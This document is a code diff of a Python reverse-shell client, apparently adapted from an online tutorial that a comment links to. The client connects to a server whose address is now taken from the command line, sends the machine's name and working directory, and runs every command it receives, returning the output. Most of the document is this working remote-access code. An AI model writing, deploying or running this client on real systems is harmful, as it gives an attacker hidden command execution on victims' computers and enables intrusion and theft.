@@ -1,9 +1,15 @@
 import socket
 import os
 import subprocess
+import sys
 # https://www.thepythoncode.com/article/create-reverse-shell-python#:~:text=How%20to%20Create%20a%20Reverse%20Shell%20in%20Python,are%20some%20ideas%20to%20extend%20that%20code%3A%20
 
-SERVER_HOST = '127.0.0.1'  #sys.argv[1]
+
+def get_id():
+    return os.environ['COMPUTERNAME']  # TODO ?find better id?
+
+
+SERVER_HOST = sys.argv[1]
 SERVER_PORT = 2424
 BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
 SEPARATOR = '<sep>'  # separator string for sending 2 messages in one go
@@ -16,12 +22,11 @@ sock.connect((SERVER_HOST, SERVER_PORT))
 
 # get the current directory
 current_dir = os.getcwd()
-# get the computer name
-c_name = os.environ['COMPUTERNAME']
-print(c_name)
-message = f'{current_dir}{SEPARATOR}{c_name}'
-sock.send(message.encode())
+# get the Unique User Identifier
+uuid = get_id()
 
+message = f'{current_dir}{SEPARATOR}{uuid}'
+sock.send(message.encode(encoding='utf-8'))
 while True:
     # receive the command from the server
     command = sock.recv(BUFFER_SIZE).decode().strip()
@@ -35,10 +40,9 @@ while True:
         try:
             # remove cd and remove leading space 
             command = command[2:].strip()  # removing ending at the same time because why not
-            
-            
+
             if len(command) < 3:
-                command += 'c:\\'[len(command):] # c: --> c:\ and c --> c:\                    at least I hope
+                command += 'c:\\'[len(command):]  # c: --> c:\ and c --> c:\                    at least I hope
             
             os.chdir(command)
 
@@ -53,11 +57,11 @@ while True:
 
     # get the current working directory as output
     current_dir = os.getcwd()
-    # get the computer name
-    c_name = os.environ['COMPUTERNAME']
+    # get the Unique User Identifier
+    uuid = get_id()
 
     # send the results back to the server
-    message = f'{output}{SEPARATOR}{current_dir}{SEPARATOR}{c_name}'
-    sock.send(message.encode())
+    message = f'{output}{SEPARATOR}{current_dir}{SEPARATOR}{uuid}'
+    sock.send(message.encode(encoding='utf-8'))
 
 sock.close()  # close client connection
